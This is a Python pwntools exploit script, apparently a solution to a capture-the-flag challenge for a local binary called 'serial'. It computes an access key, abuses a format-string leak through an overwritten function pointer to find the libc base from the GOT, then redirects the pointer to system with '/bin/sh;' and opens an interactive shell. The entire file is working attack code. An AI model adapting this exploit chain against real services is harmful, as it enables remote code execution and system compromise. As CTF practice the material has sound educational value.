#!/usr/bin/env python
from pwn import *

def calc_key():
    a = 0xacac
    b = 0xabab
    c = 0xff0
    d = 0xf0f
    k1 = (a ^ b ^ c) + (d << 8 | d >> 8)
    k2 = (b ^ d) + (b << 5 | b >> 0xb)
    k3 = c
    return str(k1 & 0xffff) + str(k2 & 0xffff) + str(k3 & 0xffff)

def add(data):
    s.sendlineafter('choice >> ', '1')
    s.sendlineafter('insert >> ', data)

def remove(index):
    s.sendlineafter('choice >> ', '2')
    s.sendlineafter('choice>> ', str(index))

def dump():
    s.sendlineafter('choice >> ', '3')

if __name__ == '__main__':
    s = process('./serial')

    elf = ELF('./serial')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

    s.sendlineafter('key: ', calc_key() + 'A' * 4 + p64(elf.got['__libc_start_main']))
    
    add(('%16$s').ljust(0x18, 'A') + p64(elf.symbols['printf']))
    dump()
    s.recvuntil('func')
    s.recvline()
    libc_base = u64(s.recvuntil('AA')[:-2].ljust(8, '\0')) - libc.symbols['__libc_start_main']
    log.info('libc base: %#x' % libc_base)

    remove(0)
    add('/bin/sh;'.ljust(0x18, 'A') + p64(libc_base + libc.symbols['system']))
    dump()
    s.recvuntil(hex(libc_base + libc.symbols['system']) + '\n')
    s.interactive()
